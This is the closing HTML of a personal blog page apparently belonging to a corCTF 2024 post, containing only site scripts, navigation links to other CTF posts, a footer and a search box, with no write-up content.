  
</section>

  
      </div>
     
      
      
        
        
          
          
        
      <script>
        var oid = "views_posts\/corctf24\/index.md"
        var oid_likes = "likes_posts\/corctf24\/index.md"
      </script>
      
      
      <script type="text/javascript" src="/js/page.min.4c1d8e0f53a5b5b7bccae87750581a0a393723aae9a9ae5622497d488b9689a4fd64a34846876e449a065aed64df10f9219b8df359a87371b998dd8bf58a1da5.js" integrity="sha512-TB2OD1Oltbe8yuh3UFgaCjk3I6rpqa5WIkl9SIuWiaT9ZKNIRoduRJoGWu1k3xD5IZuN81moc3G5mN2L9YodpQ=="></script>
      
  
    </section>
  <footer class="pt-8 max-w-prose print:hidden">

    
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
      <div class="flex justify-between pt-3">
        <span>
          
            <a class="flex group mr-3" href="/posts/googlectf/">
              <span
                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                >&larr;</span
              >
              <span
                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >GoogleCTF 2024</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2024-06-25T00:00:00&#43;00:00">25 June 2024</time>
                  
                </span>
              </span>
            </a>
          
        </span>
        <span>
          
            <a class="flex text-right group ml-3" href="/posts/sekai24/">
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >SekaiCTF 2024: htmlsandbox</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2024-08-27T00:00:00&#43;00:00">27 August 2024</time>
                  
                </span>
              </span>
              <span
                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span
                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
                >&larr;</span
              >
            </a>
          
        </span>
      </div>
    </div>
  


    
  </footer>
</article>

      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
  <a href="#the-top"
    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
    aria-label="Scroll to top" title="Scroll to top">
    &uarr;
  </a>
</div>
    </main><footer id="site-footer" class="py-10 print:hidden">
  
  
    
    <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
      <ul class="flex flex-col list-none sm:flex-row">
        
        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href="/tags/"
            title="Tags">
            
            tags
          </a>
        </li>
        
        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href="/categories/"
            title="Categories">
            
            categories
          </a>
        </li>
        
      </ul>
    </nav>
    
  
  <div class="flex items-center justify-between">

    
    
    <p class="text-sm text-neutral-500 dark:text-neutral-400">
      Copyright © Shin24
    </p>
    

    
    
    <p class="text-xs text-neutral-500 dark:text-neutral-400">
      
      
      Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
        href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
        href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
    </p>
    

  </div>
  <script>
    
    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
      margin: 24,
      background: 'rgba(0,0,0,0.5)',
      scrollOffset: 0,
    })
    
  </script>
  
  
  <script type="text/javascript" src="/js/process.min.330c9c7ed3478d29ddc83242e05f3636088799f250f724e0eee3b88057e4e288861cf148972d2ac1ed5972c27193c1c919d768bf5e52f6ef01d3abc3b16df7c2.js" integrity="sha512-MwycftNHjSndyDJC4F82NgiHmfJQ9yTg7uO4gFfk4oiGHPFIly0qwe1ZcsJxk8HJGddov15S9u8B06vDsW33wg=="></script>
  
  
</footer>
<div
  id="search-wrapper"
  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
  data-url="//localhost:1313/"
  style="z-index:500"
>
  <div
    id="search-modal"
    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
  >
    <header class="relative z-10 flex items-center justify-between flex-none px-2">
      <form class="flex items-center flex-auto min-w-0">
        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
          

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


        </div>
        <input
          type="search"
          id="search-query"
          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
          placeholder="Search"
          tabindex="0"
        />
      </form>
      <button
        id="close-search-button"
        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
        title="Close (Esc)"
      >
        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>


      </button>
    </header>
    <section class="flex-auto px-2 overflow-auto">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>

  </div>
</body>

</html>
